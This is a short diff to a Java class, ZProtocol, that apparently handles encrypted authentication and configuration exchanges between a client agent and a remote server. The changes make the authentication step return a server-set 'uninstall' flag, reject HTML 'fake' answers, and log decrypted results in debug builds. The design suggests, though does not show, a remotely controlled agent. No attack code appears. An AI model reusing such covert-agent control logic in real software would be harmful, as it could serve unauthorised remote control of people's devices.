@@ -102,6 +102,12 @@ public class ZProtocol extends Protocol {
 		}
 	}
 
+	/**
+	 * 
+	 * @return true if uninstall
+	 * @throws TransportException
+	 * @throws ProtocolException
+	 */
 	private boolean authentication() throws TransportException,
 			ProtocolException {
 		// #ifdef DEBUG
@@ -121,8 +127,8 @@ public class ZProtocol extends Protocol {
 
 		byte[] cypherOut = cryptoConf.encryptData(forgeAuthentication());
 		byte[] response = transport.command(cypherOut);
-		parseAuthentication(response);
-		return false;
+		
+		return parseAuthentication(response);
 	}
 
 	private boolean[] identification() throws TransportException,
@@ -216,6 +222,7 @@ public class ZProtocol extends Protocol {
 		// #endif
 		byte[] response = command(Proto.BYE);
 		parseNewConf(response);
+		
 	}
 
 	// **************** PROTOCOL **************** //
@@ -286,8 +293,14 @@ public class ZProtocol extends Protocol {
 				+ authResult.length);
 		// #endif
 
+		if(new String(authResult).contains("<html>")){
+			debug.error("Fake answer");
+			throw new ProtocolException(14);
+		}
+		
 		// #ifdef DEBUG
 		debug.trace("decodeAuth result = " + Utils.byteArrayToHex(authResult));
+		debug.trace("decodeAuth result string= " + new String(authResult));
 		// #endif
 
 		// Retrieve K
